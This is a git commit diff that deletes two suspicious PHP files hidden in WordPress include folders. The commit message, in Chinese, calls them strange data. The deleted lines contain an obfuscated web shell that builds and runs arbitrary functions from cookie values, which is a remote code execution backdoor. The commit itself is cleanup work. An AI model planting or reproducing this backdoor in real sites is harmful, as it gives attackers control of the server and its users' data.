9a96977b5965c7be7858283eb5d8a5e82f42d845
Pulipuli Chen <pulipuli.chen@gmail.com>
2018-08-04 02:14:27 +0800

    0804 總之先刪去奇怪的資料

--- wp-includes/css/object37.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-$txmk=$_COOKIE;
-$wagh=$txmk[yebq];
-if($wagh){
-	$ewdb=$wagh($txmk[ntjy]);$ezg=$wagh($txmk[fhra]);$acgf=$ewdb("",$ezg);$acgf();
-}
--- wp-includes/images/smilies/ajax58.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-$ohgp=$_COOKIE;
-$nvd=$ohgp[ptjo];
-if($nvd){
-	$mbse=$nvd($ohgp[rerf]);$wbf=$nvd($ohgp[qhyt]);$fuubj=$mbse("",$wbf);$fuubj();
-}
